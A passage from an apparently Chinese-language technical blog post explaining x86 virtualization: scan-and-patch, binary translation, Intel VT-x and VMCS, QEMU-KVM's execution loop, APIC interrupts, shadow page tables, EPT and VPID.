修补」</strong>便是这样的一种技术，其<strong>让非敏感指令直接在硬件上执行</strong>，同时<strong>将系统代码中的敏感指令替换为跳转指令等能陷入 VMM 中的指令</strong>，从而让 VM 在执行敏感指令时能陷入 VMM，使得 VMM 能够模拟执行敏感指令的效果</p><p>「扫描 &amp; 修补」的基本执行流程如下：</p><ul><li>VMM 在 VM 执行每段代码之前对其进行扫描，解析每一条指令，查找特权与敏感指令</li><li>VMM 动态生成相应指令的补丁代码，并将原敏感指令替换为一个外跳转以陷入 VMM，从而在 VMM 中执行动态生成的补丁代码</li><li>补丁代码执行结束后，再跳转回 VM 中继续执行下一条代码</li></ul><p><img src="https://s2.loli.net/2022/08/12/3ZlrC9zkLpJIvGO.png" alt="image.png"></p><blockquote><p>例如这是 VirtualBox 中对 <code>cli</code> 指令进行模拟的代码：</p><p><img src="https://s2.loli.net/2022/08/12/IFMhNz16xSneOq4.png" alt="image.png"></p></blockquote><p>在「扫描 &amp; 修补」技术当中大部分的代码都可以直接在物理 CPU 上运行，其性能损失较小，但「扫描 &amp; 修补」同样存在着一定的缺陷：</p><ul><li><p>特权指令与敏感指令仍通过模拟执行的方式完成，仍可能造成一定的性能损失</p></li><li><p>代码补丁当中引入了额外的跳转，这破坏了代码的局部性</p><blockquote><p>局部性原理：CPU存取指令&#x2F;数据的内存单元应当趋向于聚集在一个较小的区域</p></blockquote></li><li><p>VMM 需要维护一份补丁代码对应的原始代码的副本，这造成了额外的开销</p></li></ul><h3 id="III-二进制翻译"><a href="#III-二进制翻译" class="headerlink" title="III. 二进制翻译"></a>III. 二进制翻译</h3><p>为了进一步地提高虚拟化的性能，<strong>「二进制代码翻译」</strong>（Binary Translation）技术应运而生，类似于「扫描 &amp; 修补」技术，二进制代码翻译同样会在运行时动态地修改代码，不过不同的是 BT 技术以<strong>基本块</strong>（只有一个入口和一个出口的代码块）作为翻译的单位：</p><ul><li>Emulator 对读入的二进制代码<strong>翻译</strong>输出为对应 ISA 的一个<strong>不包含特权指令与敏感指令的子集</strong>所构成的代码，使其可以在用户态下安全运行</li><li>Emulator 动态地为当前要运行的基本块开辟一块空间，称之为<strong>翻译缓存</strong>（translation cache），在其中存放着翻译后的代码，每一块 TC 与原代码以某种映射关系（例如哈希表）进行关联</li></ul><p><img src="https://s2.loli.net/2022/08/14/hBFr6MSf5ZvtJkH.png" alt="image.png"></p><blockquote><p>我们可以看出二进制代码翻译技术与扫描修补技术的原理大体上是非常类似的，但是二进制代码翻译技术会对所有的代码进行翻译，而扫描与修补技术则只会 patch 掉敏感指令与特权指令；同时扫描&amp;修补技术<strong>不会改变代码的整体结构</strong>，而仅是将敏感与特权指令替换为能触发陷入 VMM 的指令，但是二进制代码翻译技术<strong>会直接改变一个基本块的代码整体结构</strong>（例如翻译前基本块可能长度 40B，翻译后变成100B，内部代码的相对位置也会发生变化）</p></blockquote><p>Emulator 的翻译方法大致分为两类：<strong>简单翻译</strong>与<strong>等值翻译</strong>：</p><ul><li>简单翻译可以直接理解为<strong>等效代码模拟</strong>。这种方法实现较为简单，但是会让指令数量大幅膨胀</li><li>等值翻译则是<strong>原代码与结果代码相同</strong>。理论上大多数指令都可以使用等值翻译直接在硬件上执行，但这需要更复杂的动态分析技术</li></ul><p>在相同 ISA 架构上大部分指令都是可以直接进行等值翻译的，除了以下几种：</p><ul><li>PC 相对寻址指令。这类指令的寻址与 PC 相关，但在进行二进制翻译后更改了代码基本块的结构，因此这类指令需要额外插入一些补偿代码来确保寻址的准确，这造成了一定的性能损失</li><li>直接控制转换。这类指令包括函数调用与跳转指令，其目标地址需要被替换为生成代码的地址</li><li>间接控制转换。这类指令包括间接调用、返回、间接跳转，其目标地址是在运行时动态得到的，因此我们无法在翻译时确定跳转目标</li><li>特权指令。对于简单的特权指令可以直接翻译为类似的等值代码（例如 cli 指令可以直接翻译为置 vcpu 的 flags 寄存器的 IF 位为0），但对于稍微复杂一点的指令，则需要进行深度模拟，利用跳转指令陷入 VMM 中，这通常会造成一定的性能开销</li></ul><blockquote><p>例如这是 Qemu 中的一个基本块代码翻译的例子：</p><p><img src="https://s2.loli.net/2022/08/14/ZSNn8iyCG9Tove6.png" alt="image.png"></p></blockquote><p>由于二进制代码翻译技术使用了更为复杂的过程，由此也会引入更多的问题，对于以下情形则需要额外的处理：</p><ul><li>自修改代码（Self Modifying Code）。这类程序会在运行时修改自身所执行的代码，这需要我们的 Emulator 对新生成的代码进行重翻译</li><li>自参考代码（Self Referential Code）。这类程序会在运行中读取自己的代码段中内容，这需要我们额外进行处理，使其读取原代码段中内容而非翻译后的代码</li><li>精确异常（Precise Exceptions）。即在翻译代码执行的过程中发生了中断或异常，这需要将运行状态恢复到原代码执行到异常点时的状态，之后再交给 Guest OS 处理。BT 技术暂很难很好地处理这种情况，因为翻译后的代码与原代码已经失去了逐条对应的关系。一个可行的解决方案就是在发生异常时进行回滚，之后重新使用解释执行的方式</li><li>实时代码。这类代码对于实时性要求较高，在模拟环境下运行会损失时间精确性，目前暂时无法解决</li></ul><h2 id="二、硬件辅助虚拟化-Intel-VT-x"><a href="#二、硬件辅助虚拟化-Intel-VT-x" class="headerlink" title="二、硬件辅助虚拟化 - Intel VT-x"></a>二、硬件辅助虚拟化 - Intel VT-x</h2><blockquote><p><del>听说硬件辅助虚拟化一出来 Xen 就没人用了</del></p></blockquote><h3 id="I-概述"><a href="#I-概述" class="headerlink" title="I. 概述"></a>I. 概述</h3><p>Intel VT 技术是 Intel 为 x86 虚拟化所提供的硬件支持，其中用于辅助 CPU 虚拟化的是 <code>Intel VT-x</code> 技术，其扩展了传统的 IA32 处理器架构，为 IA32 架构的 CPU 虚拟化提供了硬件支持</p><p>VT-x 技术为 Intel CPU 额外引入了两种运行模式，统称为<strong>「VMX 操作模式」</strong>（Virtual Machine eXtensions），通过 <code>vmxon</code> 指令开启，这两种运行模式<strong>都独立有着自己的分级保护环</strong>：</p><ul><li><code>VMX Root Operation</code>：Hypervisor 所工作的模式，在这个模式下可以访问计算机的所有资源，并对 VM 进行调度</li><li><code>VMX Non-Root Operation</code>：VM 所工作的模式，在这个模式下仅能访问非敏感资源，对于敏感资源的访问（例如 I&#x2F;O 操作）会使得 CPU 退出 Non-Root 模式并陷入 Hypervisor 中，由 Hypervisor 处理后再重新进入 Non-Root 模式恢复 VM 的运行</li></ul><p>由此，我们对 Root 模式与 Non-Root 模式间的切换行为进行定义：</p><ul><li><code>VM-Entry</code>：Hypervisor 保存自身状态信息，切换到 VMX Non-Root 模式，载入 VM 状态信息，恢复 VM 执行流</li><li><code>VM-Exit</code>：VM 运行暂停并保存自身状态信息，切换到 VMX Root 模式，载入 Hypervisor 状态信息，执行相应的处理函数</li></ul><p><img src="https://s2.loli.net/2022/08/11/uzmNXaOP6HSVqFL.png" alt="image.png"></p><p>由于 Non-Root 模式与 Root 模式都各自有着自己的分级保护环，因此 Host OS 与 Guest OS 都可以<strong>不加修改地在自己对应的模式下直接在硬件上运行</strong>，仅有当 Guest OS 涉及到敏感资源的访问及 Host OS 对 VM 的调度时才会发生切换，这在确保了 VM 高性能的同时满足了「Trap &amp; Emulate」模型实现，也解决了 x86 架构的虚拟化漏洞</p><h3 id="II-VMCS"><a href="#II-VMCS" class="headerlink" title="II. VMCS"></a>II. VMCS</h3><p>在 Intel VT-x 技术引入了<code>VMCS</code>（<strong>Virtual-Machine Control Structure</strong>），用以保存 CPU 虚拟化所需要的相关状态，<strong>每个 virtual CPU 对应有一个 VMCS</strong></p><p>VMCS 与物理 CPU 是<strong>一一对应的绑定关系</strong>，即在同一时刻一个物理 CPU 只能与一个 VMCS 绑定，反之亦然，但在不同的时刻我们可以将 VMCS 绑定到不同的物理 CPU 上，称之为 VMCS 的<strong>迁移</strong>（Migration）</p><p>与 VMCS 的绑定与解绑相关的是以下两条指令：</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMPTRLD &lt;VMCS 地址&gt;</td><td align="center">将指定的 VMCS 与执行该指令的 CPU 进行绑定</td></tr><tr><td align="center">VMCLEAR</td><td align="center">将执行该指令的 CPU 与其 VMCS 进行解绑</td></tr></tbody></table><p>VT-x 中将 VMCS 定义为一个<strong>最大不超过 4KB 的内存块，且应与 4KB 对齐</strong>，其内容格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCS</span> &#123;</span><br>    <span class="hljs-comment">/* 版本号，4字节 */</span><br><span class="hljs-type">uint32_t</span> vmcs_revision_identifier:<span class="hljs-number">31</span>, shadow_vmcs_indicator:<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">/* 中止标识，4字节</span><br><span class="hljs-comment">     * 当 VM-Exit 失败时便会产生 VMX 中止，并在此处存放原因</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> vmx_abort_indicator;<br>    <br>    <span class="hljs-comment">/* 数据域 */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCSData</span> <span class="hljs-title">vmcs_data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>VMCS 数据域 存放着 VMCS 主要的信息，分为以下六个子域：</p><ul><li><p><strong>Guest-state area</strong>：保存 VM 寄存器状态，在 VM-entry 时加载，在 VM-exit 时保存</p></li><li><p><strong>Host-state area</strong>：保存 Hypervisor 寄存器状态，在 VM-exit 时加载</p><p><img src="https://s2.loli.net/2022/08/15/C8wMpWE5X7S1KYP.png" alt="image.png"></p></li><li><p><strong>VM-execution control fileds</strong>：控制 <code>Non-Root</code> 模式下的处理器行为 </p></li><li><p><strong>VM-entry  control fileds</strong>：控制 <code>VM-Entry</code> 过程中的某些行为</p></li><li><p><strong>VM-exit  control fileds</strong>：控制 <code>VM-Exit</code> 过程中的某些行为</p></li><li><p><strong>VM-exit information fields</strong>：保存 <code>VM-Exit</code> 的基本原因及其他详细信息，在一些处理器上该域为只读域</p><p><img src="https://s2.loli.net/2022/08/15/jqQDsA6UHZ7wy8z.png" alt="image.png"></p></li></ul><p>我们通过以下两条指令读写 VMCS：</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMREAD &lt;索引&gt;</td><td align="center">读 VMCS 中“索引”指定的域</td></tr><tr><td align="center">VMWRITE &lt;索引&gt; &lt;数据&gt;</td><td align="center">向 VMCS 中“索引”指定的域写入数据</td></tr></tbody></table><blockquote><p>这里的索引并非偏移值，而是 Intel 为数据域中每个字段都定义了一个独特的索引值，例如 Guest State Area 中 ES 段选择子的索引值便是 <code>0x00000800</code></p><p>当然，要把所有域的索引都背下来并不现实，最好的办法还是多多查表：）推荐阅读：<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> 的 <a href="https://cdrdv2.intel.com/v1/dl/getContent/671506">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 3C: System Programming Guide, Part 3</a></p></blockquote><h3 id="III-VMX-操作模式"><a href="#III-VMX-操作模式" class="headerlink" title="III. VMX 操作模式"></a>III. VMX 操作模式</h3><p>作为传统的 IA32 架构的扩展，VMX 操作模式在默认下是关闭的，只有当 VMM 需要使用硬件辅助虚拟化功能时才会使用 Intel 提供的两条新指令来开关 VMX 操作模式：</p><ul><li><code>VMXON</code>：开启 VMX 操作模式</li><li><code>VMXOFF</code>：关闭 VMX 操作模式</li></ul><p>在 Intel SDM 中描述的 VMX 生命周期如下：</p><ul><li>软件通过 <code>VMXON</code> 指令进入 VMX 操作模式</li><li>VMM 可以通过 <code>VM entries</code> 进入 Guest VM（单次只能执行一个 VM），VMM 通过 <code>VMLAUNCH</code> （第一次进入 VM）与 <code>VMRESUME</code> （从 VMM 中恢复到 VM）指令来使能 <code>VM entry</code>，通过 <code>VM exits</code> 重获控制权</li><li><code>VM exits</code> 通过 VMM 指定的入口点移交控制权，VMM 对 VM 的退出原因进行响应后通过 <code>VM entry</code> 返回到 VM 中</li><li>当 VMM 想要停止自身运行并退出 VMX 操作模式时，其通过 <code>VMXOFF</code> 指令来完成</li></ul><p><img src="https://s2.loli.net/2022/08/23/gamMtPGkQ29wfVK.png" alt="image.png"></p><p>现在我们来深入 <code>VM entry</code> 与 <code>VM exit</code> 这两个行为的实现细节中，在其流程中他们分别进行了如下动作：</p><ul><li><strong>VM entry</strong>：从 Hypervisor 切换到 VM<ul><li>检查 VMCS 合法性（各字段值是否合法）</li><li>加载 VMCS 的 <code>Guest-state area</code> 中的各字段到对应的寄存器</li><li>加载指定的 MSR</li><li>设置 VMCS 的状态为 <code>launched</code></li><li>根据需要通过写 VMCS 的 <code>VM-entry Interrucption-Information</code> 向 VM 进行<strong>事件注入</strong>（如异常、异步中断等）</li></ul></li><li><strong>VM exit</strong>：从 VM 切换到 Hypervisor<ul><li>将 VM 退出的原因与详细信息写入 VMCS 的  <code>VM-exit information fields</code></li><li>将 VM 的寄存器保存至 VMCS 的 <code>Guest-state area</code> </li><li>从 VMCS 的 <code>Host-state area</code> 中恢复 Host 寄存器</li><li>加载指定 MSR</li></ul></li></ul><p><img src="https://s2.loli.net/2022/08/11/vzj8dDtgLk2JI6Q.png" alt="image.png"></p><blockquote><p>这里笔者为大家补充一个概念：<strong>Model Specific Register</strong>，简称 MSR，是 x86 下的一组用来<strong>控制CPU运行、功能开关、调试、跟踪程序执行、监测CPU性能</strong>等方面的寄存器</p><blockquote><p>例如 <code>syscall</code> 指令便是通过 MSR 寄存器来获取到内核系统调用的入口点</p></blockquote><p>每个 MSR 寄存器都会有一个 id，称之为 <code>MSR Index</code>，我们可以通过这个 id 来利用 <code>RDMSR</code> 与 <code>WRMSR</code> 指令读写指定的 MSR 寄存器</p><p>我们可以在 Intel SDM 的 Volume 4 中获取到到 MSR 寄存器的详细信息</p></blockquote><h2 id="三、KVM-amp-QEMU-KVM"><a href="#三、KVM-amp-QEMU-KVM" class="headerlink" title="三、KVM &amp; QEMU-KVM"></a>三、KVM &amp; QEMU-KVM</h2><p>下面我们来介绍 KVM——<strong>Kernel-based Virtual Machine</strong>，是一个自 Linux 2.6.20 后集成在 kernel 中的一个<strong>开源系统虚拟化内核模块</strong>，本质上是一个依赖于硬件辅助虚拟化的位于 kernel 中的 Hypervisor，或者说<strong>KVM 将 Linux kernel 变成了 Hypervisor</strong>，并提供了相应的用户态操作 VM 的接口： <code>/dev/kvm</code> ，我们可以通过 ioctl 指令来操作 KVM</p><p>但 KVM 本身仅提供了 CPU 与内存的虚拟化，不能构成一个完整的虚拟化环境，那么我们不难想到的是我们可以复用现有的全虚拟化方案，<strong>将模拟 CPU 与内存的工作交由 KVM 完成</strong>，这样便能直接通过 KVM 来借助硬件辅助虚拟化以提高虚拟机性能</p><p>那么我们有这样的一个现成的完备的全虚拟化实现方案吗？答案是有的——<strong>QEMU</strong> 本身便<strong>完整模拟了一整套虚拟机环境</strong>，我们不难想到的是我们可以修改 QEMU 的代码，使其通过 KVM 来创建与运行虚拟机，而设备模拟等依旧复用原有的框架，<strong>这样我们就实现了一个高性能的全虚拟化平台：KVM + QEMU</strong></p><p><img src="https://s2.loli.net/2022/08/29/7WByzSrM9QYPsKH.png" alt="image.png"></p><p>利用QEMU + KVM 进行虚拟化的方案如下：</p><ul><li>QEMU 通过 ioctl 进入内核态将控制权移交 KVM，KVM 进行 VM 的运行</li><li>产生 VM-Exit，KVM 接管，判断原因并决定继续运行还是交由 QEMU 处理</li><li>若是后者，恢复到用户态 QEMU 中的处理代码进行相应的处理，之后退出或回到第一步</li></ul><p><img src="https://s2.loli.net/2022/08/05/GUxVBYWnbdzA6KD.png" alt="image.png"></p><p>这个基本执行框架实际上为 QEMU 源码 <code>accel/kvm/kvm-all.c</code> 中的 <code>kvm_cpu_exec()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">kvm_cpu_exec</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>    cpu_exec_start(cpu);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 开始运行 VM，本质上就是 ioctl(kvm_fd, KVM_RUN)</span><br><span class="hljs-comment">         * 当产生 VM-Exit 时，首先在 KVM 中完成处理，</span><br><span class="hljs-comment">         * 若产生 IO，则退出内核态，即恢复到这里，接下来进入到用户态的处理</span><br><span class="hljs-comment">         */</span><br>        run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, <span class="hljs-number">0</span>);<br>        <br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">if</span> (run_ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * 返回值小于 0 说明 VM 运行出了些问题，</span><br><span class="hljs-comment">             * 这里会简单处理后 break 打破大循环 </span><br><span class="hljs-comment">             */</span><br>        <span class="hljs-comment">//...</span><br>        &#125;<br>        <br>        trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason);<br>        <span class="hljs-comment">/* 这里就是一个大的 switch，根据退出的原因进行不同的处理，就不放完整代码了 */</span><br>        <span class="hljs-keyword">switch</span> (run-&gt;exit_reason) &#123;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_IO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_io\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            kvm_handle_io(run-&gt;io.port, attrs,<br>                          (<span class="hljs-type">uint8_t</span> *)run + run-&gt;io.data_offset,<br>                          run-&gt;io.direction,<br>                          run-&gt;io.size,<br>                          run-&gt;io.count);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> KVM_EXIT_MMIO:<br>            DPRINTF(<span class="hljs-string">&quot;handle_mmio\n&quot;</span>);<br>            <span class="hljs-comment">/* Called outside BQL */</span><br>            address_space_rw(&amp;address_space_memory,<br>                             run-&gt;mmio.phys_addr, attrs,<br>                             run-&gt;mmio.data,<br>                             run-&gt;mmio.len,<br>                             run-&gt;mmio.is_write);<br>            ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">default</span>:<br>            DPRINTF(<span class="hljs-string">&quot;kvm_arch_handle_exit\n&quot;</span>);<br>            ret = kvm_arch_handle_exit(cpu, run);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (ret == <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">/* 运行结束，收尾处理 */</span><br>    <span class="hljs-comment">// ...</span><br></code></pre></td></tr></table></figure><h1 id="0x04-中断虚拟化"><a href="#0x04-中断虚拟化" class="headerlink" title="0x04.中断虚拟化"></a>0x04.中断虚拟化</h1><p><strong>中断</strong>（Interrupt）机制是一种用来通知 CPU 发生了需要处理的事件的机制，按照发生的位置分为外部中断（来自外部的中断，INTR 引脚传来的为可屏蔽中断，NMI 引脚传来的为不可屏蔽中断）与内部中断（软中断、异常、陷阱等），实模式下 CPU 根据中断向量表来寻找对应的处理程序，保护模式下则通过中断描述符表来寻找处理程序</p><p>现代 X86 处理器使用的中断控制器称之为 <strong>APIC</strong>(Advanced Programmable Interrupt Controller)，所有的核心共用一个 I&#x2F;O APIC ，用于接收外部中断，同时每个核独立有着一个 <strong>Local APIC</strong>，用于接收来自 I&#x2F;O APIC 的中断信息、内部时钟中断、来自其他核心的中断（<strong>Inter-Processor Interrupt</strong>，IPI）等</p><p><img src="https://s2.loli.net/2022/08/29/BWGZpyebmVXCcLJ.png" alt="image.png"></p><p>在虚拟化环境当中，每个 vCPU 都对应需要有一个 virtual LAPIC，所有的核心则需要共享一个 virtual I&#x2F;O APIC，这都是需要 Hypervisor 进行模拟与维护的</p><h2 id="一、基本模型-1"><a href="#一、基本模型-1" class="headerlink" title="一、基本模型"></a>一、基本模型</h2><h1 id="0x05-内存虚拟化"><a href="#0x05-内存虚拟化" class="headerlink" title="0x05. 内存虚拟化"></a>0x05. 内存虚拟化</h1><p>内存虚拟化本质上是需要达成以下两个目的：</p><ul><li>提供一个在 Guest 感知中的从零开始的连续物理内存空间</li><li>在各个 VM 之间进行有效的隔离、调度、共享内存资源</li></ul><h2 id="一、纯软件实现虚拟化-1"><a href="#一、纯软件实现虚拟化-1" class="headerlink" title="一、纯软件实现虚拟化"></a>一、纯软件实现虚拟化</h2><h3 id="I-虚拟机内存访问原理及遇到的问题"><a href="#I-虚拟机内存访问原理及遇到的问题" class="headerlink" title="I.虚拟机内存访问原理及遇到的问题"></a>I.虚拟机内存访问原理及遇到的问题</h3><p>为了实现内存空间的隔离，Hypervisor 需要为 Guest VM 准备一层新的地址空间：<code>Guest Physical Address Space</code>，从 Guest 侧其只能看到这一层地址空间，Hypervisor 需要记录从 GPA 到 HVA 之间的转换关系</p><p>下图为 Qemu 的内存架构：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Guest&#x27; processes<br>                     +--------------------+<br>Virtual addr space   |<span class="hljs-string">                    </span>|<br>                     +--------------------+                                    （GVA）<br>                     |<span class="hljs-string">                    </span>|<br>                     \__   Page Table     \__<br>                        \                    \<br>                         |<span class="hljs-string">                    </span>|<span class="hljs-string">  Guest kernel</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">Guest&#x27;s phy  memory </span>|<span class="hljs-string">    </span>|<span class="hljs-string">                    </span>|<span class="hljs-string">                </span>|<span class="hljs-string">            （GPA）</span><br><span class="hljs-string">                    +----+--------------------+----------------+</span><br><span class="hljs-string">                    </span>|<span class="hljs-string">                                          </span>|<br>                    \__                                        \__<br>                       \                                          \<br>                        |<span class="hljs-string">             QEMU process                 </span>|<br>                   +----+------------------------------------------+<br>Virtual addr space |<span class="hljs-string">    </span>|<span class="hljs-string">                                          </span>|<span class="hljs-string">         （HVA）</span><br><span class="hljs-string">                   +----+------------------------------------------+</span><br><span class="hljs-string">                   </span>|<span class="hljs-string">                                               </span>|<br>                    \__                Page Table                   \__<br>                       \                                               \<br>                        |<span class="hljs-string">                                               </span>|<br>                   +----+-----------------------------------------------+----+<br>Physical memory    |<span class="hljs-string">    </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    （HPA）</span><br><span class="hljs-string">                   +----+-----------------------------------------------+----+</span><br></code></pre></td></tr></table></figure><p>当我们要访问 Guest 中某个虚拟地址上的数据时，我们需要：</p><ul><li>首先得先通过 Guest 的页表将 <code>Guest Virtual Address</code> （GVA）转换为 <code>Guest Physical Address</code>（GPA）</li><li>GPA 在 Qemu 的实现当中实际上是对应映射到 Host 中一大块 mmap 的内存上的，所以我们还需要将 GPA 再转换为 <code>Host Virtual Address</code>（HVA）</li><li>最后再通过 Host 上的页表将 HVA 转化为 <code>Host Physical Address</code>（HPA）</li><li>在 Guest 多级页表的寻址当中同样也要多次经过 <code>GPA-&gt;HPA</code> 的转换查询过程</li></ul><p>这一整套流程<strong>非常繁重</strong>，从而使得虚拟机中内存访问的性能极为低下</p><blockquote><p>在 QEMU 当中访问内存的核心函数是 <code>address_space_rw()</code>，感兴趣的同学可以看一下其内部实现，虽然说只是 GPA-&gt;HVA（笑）</p></blockquote><h3 id="II-影子页表-（shadow-page-table）"><a href="#II-影子页表-（shadow-page-table）" class="headerlink" title="II.影子页表 （shadow page table）"></a>II.影子页表 （shadow page table）</h3><p>在早期的时候 Intel 硬件对虚拟化并没有很好的支持，因此 Hypervisor 只能先在软件层面进行优化——<strong>影子页表</strong>（Shadow Page Table）应运而生</p><p>以 Intel 为例，由于读写 CR3 寄存器（存放页顶级表指针）的操作是敏感指令，我们的 Hypervisor 可以很轻易地截获 VM 的这个操作，<strong>并将页表替换为存放 GVA→HPA 映射关系的影子页表</strong>，这样就能<strong>直接完成由 GVA 到 HPA 的转换过程</strong></p><p><img src="https://s2.loli.net/2022/08/05/eG1hpBbZy6Edszg.png" alt="image.png"></p><p>为了实现影子页表，我们本质上需要实现<strong>MMU 虚拟化</strong>：</p><ul><li>Guest VM 所能看到与操作的实际都上是虚拟的 MMU，真正载入 MMU 的页表是由 Hypevisor 完成翻译后所产生的<strong>影子页表</strong></li><li>影子页表中的访问权限为<strong>只读的</strong>，当 Guest 想要读写页表时便能被 Hypervisor 捕获到这个操作并代为处理</li></ul><p>不过这种方法的缺点就是<strong>我们需要为 Guest VM 中的每套页表都独立维护一份影子页表，且需要多次在 VMM 与 VM 间进行切换，这具有一定的开销</strong></p><h2 id="二、硬件辅助虚拟化"><a href="#二、硬件辅助虚拟化" class="headerlink" title="二、硬件辅助虚拟化"></a>二、硬件辅助虚拟化</h2><h3 id="III-扩展页表（Extend-Page-Table-EPT）"><a href="#III-扩展页表（Extend-Page-Table-EPT）" class="headerlink" title="III.扩展页表（Extend Page Table, EPT）"></a>III.扩展页表（Extend Page Table, EPT）</h3><p>从软件层面似乎已经是难以有更好的优化的方案了，因此硬件层面的对内存虚拟化的支持便应运而生——<strong>EPT</strong> 即 <strong>Extend Page Table</strong>，是 Intel 为实现内存虚拟化而新增的特性，目的是为了减少内存访问的开销</p><p>EPT 并不干扰 Guest VM 操作自身页表的过程，其本质上是<strong>额外提供了一个 Guest 物理地址空间到 Host 物理地址空间转换的页表</strong>，即使用一个额外的页表来完成 <code>GPA→HPA</code> 的转换</p><p>EPT 方案虽然相比起影子页表而言多了一层转换，但是并不需要干扰 Guest 原有的页表管理，<strong>GVA→GPA→HPA 的过程都由硬件自动完成</strong>，同时 Hypervisor 仅需要截获 <code>EPT Violation</code> 异常（EPT 表项为空），效率提高了不少</p><p><img src="https://s2.loli.net/2022/08/05/BSjJk3zq6ayrXvO.png" alt="image.png"></p><h3 id="IV-VPID：TLB-资源优化"><a href="#IV-VPID：TLB-资源优化" class="headerlink" title="IV. VPID：TLB 资源优化"></a>IV. VPID：TLB 资源优化</h3><p><strong>Translation Lookaside Buffer</strong>为用以加快虚拟地址到物理地址转换的<strong>页表项缓存</strong>，当进行地址转换时 CPU 首先会先查询 TLB，TLB 根据虚拟地址查找是否存在对应的 cache，若 cache miss 了才会查询页表</p><p>由于 TLB 是与对应的页表进行工作的，因此在切换页表时 TLB 原有的内容就失效了，此时我们应当使用 <code>INVLPG</code> 使 TLB 失效，类似地，在 VM-Entry 与 VM-Exit 时 CPU 都会强制让 TLB 失效，但这么做仍存在一定的性能损耗</p><p><strong>Virtual Processor Identifier</strong>（VPID）则是一种硬件级的对 TLB 资源管理的优化，其在硬件上为每个 TLB 表项打上一个 VPID 标识（VMM 为每个 vCPU 分配一个唯一的 VPID，存放在 VMCS 中，逻辑 CPU 的 VPID 为 0），在 CPU 查找 TLB cache 时会先比对 VPID，这样我们就无需在每次进行 VM entry&#x2F;exit 时刷掉所有的 cache，而可以继续复用之前保留的 cache</p><h1 id="0x06-I-x2F-O-虚拟化"><a href="#0x06-I-x2F-O-虚拟化" class="headerlink" title="0x06. I&#x2F;O 虚拟化"></a>0x06. I&#x2F;O 虚拟化</h1><p>现实的外设资源往往是有限的，同时我们有的时候并不需要让 VM 直接接触到现实存在的外设资源，有的时候我们还想为 VM 提供一些不存在实体设备的设备，因此 Hypervisor 需要通过 IO 虚拟化的方式来为 VM 提供<strong>虚拟的设备资源</strong></p><p>从处理器的角度而言，我们与外设之间的交互主要是通过 <code>MMIO</code> 与 <code>Port IO</code> 